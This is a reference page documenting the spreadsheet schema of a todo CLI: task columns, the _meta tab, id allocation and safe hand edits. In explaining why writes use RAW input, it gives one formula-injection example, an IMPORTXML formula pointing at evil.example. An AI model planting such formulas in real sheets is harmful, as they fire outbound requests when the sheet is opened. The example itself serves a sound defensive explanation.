# Sheet schema

This page is the contract. If you only read one reference page before hand-editing the spreadsheet,
read this one.

The schema is declared in a single place, `src/Todo.Domain/Tasks/TaskSchema.cs`. Everything that reads
or writes a task tab resolves columns through it, which is why adding a column is one edit there plus
the row mapper.

## The task tab

Every space tab has a header row in row 1 and one task per row below it.

| Position | Column | Type | Required | Notes |
| --- | --- | --- | --- | --- |
| 1 | `id` | integer as text | **yes** | Per space, unique, never reused. |
| 2 | `name` | text | **yes** | Trimmed on read and write. Max 200 chars. |
| 3 | `description` | text | no | Max 4000 chars. Empty string when absent. |
| 4 | `status` | text | **yes** | Canonical name: `pending`, `ongoing`, `backlog`, `completed`. Aliases are normalised on read, canonical is always written. |
| 5 | `due_on` | `yyyy-MM-dd` | no | Blank when no due date. |
| 6 | `created_at` | ISO-8601 UTC | **yes** | Written as `yyyy-MM-ddTHH:mm:ssZ`. |
| 7 | `completed_at` | ISO-8601 UTC | no | Blank unless the task is completed. |
| 8 | `remarks` | text | no | Max 4000 chars. Empty string when absent. |

Canonical column order is exactly:

```text
id, name, description, status, due_on, created_at, completed_at, remarks
```

`TaskSchema.Version` is `1`, and this is what the `_meta` tab records as `schema_version`.

::: warning Reordering is safe for reading, not for writing
This is the one place where the implementation does less than the design intent, and it matters.

**Reads** resolve columns by header name. `TaskSchemaBinding.ValidateHeaders` builds a name → index map
from row 1 (case-insensitive, whitespace-trimmed), and `TaskRowMapper.FromRow` fetches each field
through that binding. A reordered sheet reads correctly.

**Writes** do not. `TaskRowMapper.ToRow` always emits cells in `TaskSchema.Columns` order, and both
write paths — `AppendValuesAsync` on `A:H` and `WriteValuesAsync` on `RowRange(n)` = `A<n>:H<n>` — start
at column A. So on a reordered sheet a write lands in the wrong columns:

```text
Sheet row 1:  status | id | name | description | due_on | created_at | completed_at | remarks
todo writes:  id     | name | description | status | due_on | created_at | completed_at | remarks
```

Editing a task or adding one on a reordered tab will therefore scramble the row. Treat the canonical
column order as part of the contract until the write path also goes through the binding:

```text
id, name, description, status, due_on, created_at, completed_at, remarks
```

What is *definitely* not safe is a missing required column, a misspelt header, or two columns with the
same name (the first occurrence wins). Those are conflicts, exit code 1:

```text
✗ The sheet is missing required column 'created_at'. Run 'todo doctor --fix'.
```
:::

### Reading beyond the schema

`todo` reads `A:Z`, not `A:H`. This is intentional: a column you add by hand shows up as extra data
rather than being silently truncated, so you notice the divergence instead of quietly losing the tail
of a row.

### Tolerances on read

`TaskRowMapper.FromRow` accepts what Google actually returns, which is loosely typed:

| Situation | Handling |
| --- | --- |
| `id` arrives as a number (`7d`) instead of a string | Accepted. Whole numbers only. |
| `id` has surrounding whitespace | Trimmed. |
| Row is shorter than the header row | Missing cells read as `null` → empty string or null. |
| Row is entirely blank | Skipped, not treated as a task. |
| `status` has surrounding whitespace or an alias (`  done  `) | Normalised to `completed`. |
| `due_on` is blank, `""` or `null` | Treated as no due date. |
| `name` has surrounding whitespace | Trimmed. |

Anything genuinely unparseable becomes a **conflict** naming the row number, so you can go straight to
it:

```text
✗ Row 12 has an unrecognised status 'sideways'. Accepted values: pending, ongoing, backlog, completed.
```

Rows are 1-based spreadsheet row numbers, so `Row 12` is what you see in the sheet's row gutter.

## `_meta`

`_meta` is an internal tab, not a space. It never appears in `todo spaces`, cannot be created with
`todo space add`, and cannot be deleted with `todo space rm`. Any tab whose name starts with `_` is
excluded the same way.

Its layout is two columns:

| A | B |
| --- | --- |
| `key` | `value` |

Known keys:

| Key | Value | Purpose |
| --- | --- | --- |
| `schema_version` | `1` | Schema version. `todo doctor` compares it against `TaskSchema.Version`. |
| `next_id:<space>` | integer | The id counter for that space, one row per space. |

```text
key                 value
schema_version      1
next_id:default     8
next_id:work        3
```

Behaviour:

- Key matching is case-insensitive.
- Updates **replace the existing row** rather than appending a duplicate. `SheetsGateway.ReadMetaAsync`
  records each key's A1 row number, and `UpsertMetaAsync` writes to that row; only a genuinely new key
  is appended.
- A missing `_meta` tab reads as empty rather than failing. `todo doctor --fix` recreates it with its
  header row and a `schema_version` entry.
- A missing `next_id:<space>` entry is not fatal — see the id rule below.

## Id allocation

Ids are **per space**, auto-increment, and never reused.

```text
next = max( max(counter, highestExistingId + 1), 1 )
```

where `counter` is the `next_id:<space>` value in `_meta` and `highestExistingId` is the largest `id`
in the space tab.

Why take the maximum of both:

- **The counter can lag.** A previous append may have written its row and then failed to write the
  counter. Without the `highestExistingId + 1` term, the next add would hand out a duplicate id.
- **The counter can lead.** After a row is deleted by hand, `highestExistingId` drops but the counter
  does not, which is exactly what keeps ids from being reused.

And the consequences:

| Event | Effect on the next id |
| --- | --- |
| Add a task | Counter becomes `id + 1` |
| `todo rm <id>` (deletes the row) | No change to the counter — the id is not recycled |
| Delete a row by hand in Sheets | No change — the counter still guarantees a fresh id |
| Delete the `next_id` row from `_meta` | Recomputed as `highest existing + 1` |
| Counter write fails after a successful append | Gap in ids; next add still gets a fresh id |

A failed counter write deliberately does **not** fail the add. The row is already on the sheet, so the
worst case is a gap in the id sequence, not a lost task.

::: warning Never renumber ids by hand
An id is the only handle the CLI and dashboard have for a task. Renumbering rows silently repoints
every cached id in your shell history, your notes and any script. Delete rows instead — ids do not need
to be contiguous.
:::

## RAW value input, and why it matters

Every write goes through `ValueInputOption.RAW`. No write to a task tab or to `_meta` uses
`USER_ENTERED`. That is not a detail; it is what makes the id contract and the text contract hold.

With `USER_ENTERED`, Google runs the submitted string through the spreadsheet's own input parser, as if
you had typed it into a cell:

| Value `todo` writes | `USER_ENTERED` would do | `RAW` does |
| --- | --- | --- |
| `2026-12-01` as `due_on` | Convert to a date serial number | Store the literal text `2026-12-01` |
| `1-2` in a name or description | Convert to a date (`2 Jan` or `1 Feb` depending on locale) | Store the literal text `1-2` |
| `=SUM(A1:A9)` in a name | Evaluate as a formula | Store the literal text `=SUM(A1:A9)` |
| `007` in a description | Convert to the number `7` | Store the literal text `007` |
| `+1 555 0100` in remarks | Convert to a phone-like number | Store the literal text |
| `50%` in remarks | Convert to `0.5` | Store the literal text `50%` |

Three concrete problems this avoids:

1. **Date coercion breaks the round trip.** If `due_on` is stored as a date serial, reading it back as
   an unformatted value gives a number, and `DueDate.TryParse` requires exactly `yyyy-MM-dd`. A task
   could not be read back after being written.
2. **Locale drift.** `1-2` is a date in some locales and text in others. The same write would produce
   different data on different machines.
3. **Formula injection.** A task named `=IMPORTXML("http://evil.example", "//x")` would become a live
   formula that evaluates when anyone opens the sheet. With `RAW`, it stays the text `=IMPORTXML(...)`
   and is never evaluated. This matters because task names and descriptions are exactly the kind of
   field that receives pasted external content.

Reads are likewise explicit: `ValueRenderOption.UNFORMATTEDVALUE`, so a cell you formatted as a date in
the UI still comes back as the stored value, not a locale-rendered string.

::: danger Consequence: do not retype schema cells as formulas
Because `todo` reads unformatted values, a formula in a `status` or `created_at` cell is read as its
**cached result**, which may be a number or a locale string. It will not parse, and the row becomes a
conflict. Keep the eight schema columns as plain values.
:::

## Safe to edit by hand

Direct spreadsheet edits are a supported workflow. These are safe:

| Change | Safe? | Notes |
| --- | --- | --- |
| Reorder columns | **Reads only** | Reads resolve by header name; writes always start at column A in canonical order, so a reordered tab gets scrambled by the next edit. Do not reorder. |
| Rename a space by renaming its tab | Yes, if the name is valid | Must satisfy the naming rules. Update `defaultSpace` in config if it was the default. |
| Add a column to the right | Yes | Ignored by `todo`, preserved on read as extra data. Writes do not touch it. |
| Edit `name`, `description`, `remarks` | Yes | Kept as text because reads are unformatted. |
| Change `status` to a canonical name or any alias | Yes | Must be in the accepted set. |
| Set `due_on` to `yyyy-MM-dd` | Yes | Set the cell format to plain text first if Sheets insists on reformatting. |
| Clear `due_on` | Yes | Blank means no due date. |
| Delete a task row | Yes | Ids are not recycled; the counter keeps things safe. |
| Delete a space tab | Yes | Equivalent to `todo space rm` without the confirmation. |
| Sort rows | Yes | Row order is irrelevant; the default sort is computed on read, and row numbers are resolved from the sheet each time. |
| Add a task row by hand | With care | You must supply `id`, `name`, `status` and `created_at` in the right formats, in the canonical column positions. Leave `id` unique and higher than the current highest. |

## Not safe to edit by hand

| Change | Why |
| --- | --- |
| Remove a required column header (`id`, `name`, `status`, `created_at`) | Conflicts on every operation for that space until repaired. |
| Misspell a header (`Status`, `statu`, `due-date`) | The column silently disappears from the binding. `status` and `created_at` are required, so their absence is caught; misspelling `due_on` loses the due dates without any error. |
| Duplicate a header name | The first occurrence wins; the second is ignored. Writes go to the first. |
| Rename `_meta` or its `key`/`value` headers | Schema detection and id allocation break. |
| Renumber `id` values | Repoints every id you have recorded outside the sheet. |
| Put a formula in a schema column | Read as a cached result, usually unparseable → conflict. |
| Reformat `created_at` / `completed_at` as a localised date | Fails ISO-8601 parsing → conflict. |
| Merge cells, insert subtotal rows, or use multiple header rows | Every non-blank row that is not a task is parsed as a task and fails. |
| Change `status` to an unaccepted word | Conflict naming the row. |
| Add a second sheet as a "reference" inside a space tab | It is read as task rows. Use a separate tab; tabs starting with `_` are excluded. |

## Schema versioning

`TaskSchema.Version` is `1` and is written into `_meta` as `schema_version`. `todo doctor` compares the
two and reports readiness:

```text
schema            ready (v1)
```

```text
schema            not ready (found v0, expected v1)
```

Version `0` means the key was absent or unparseable. Missing versions are repaired by
`todo doctor --fix`, which ensures the `_meta` tab, its header row and the `schema_version` entry.

There is no migration engine. There is one schema version, and a version mismatch is a diagnostic
signal, not a migration trigger. If the schema ever needs to change shape, the version number is the
hook for a future migration; today the only supported value is `1`.

## A complete, valid tab

```text
id | name                 | description            | status    | due_on     | created_at           | completed_at         | remarks
1  | renew the domain     |                        | pending   | 2026-11-30 | 2026-11-20T09:41:07Z |                      |
2  | write the docs       | cover init, add, ls    | ongoing   | 2026-12-01 | 2026-11-20T09:42:11Z |                      | draft in docs/
3  | ship v1              |                        | backlog   |            | 2026-11-20T09:43:02Z |                      | after docs
4  | call the bank        | ask about the transfer | completed | 2026-11-18 | 2026-11-19T14:02:44Z | 2026-11-20T08:15:33Z | ref 88213
```

Cross-check with this table:

| Check | Value |
| --- | --- |
| `id` | unique, integers, 1, 2, 3, 4 |
| `status` | all canonical |
| `due_on` | `yyyy-MM-dd` or blank |
| `created_at` | `…Z` suffix, no offset |
| `completed_at` | set only on row 4, which is the only `completed` task |
| `next_id:<space>` | should be `5` |

The last row is the one to internalise: a `completed` task has a `completed_at`, and no other task
does. Reopening it clears the field.
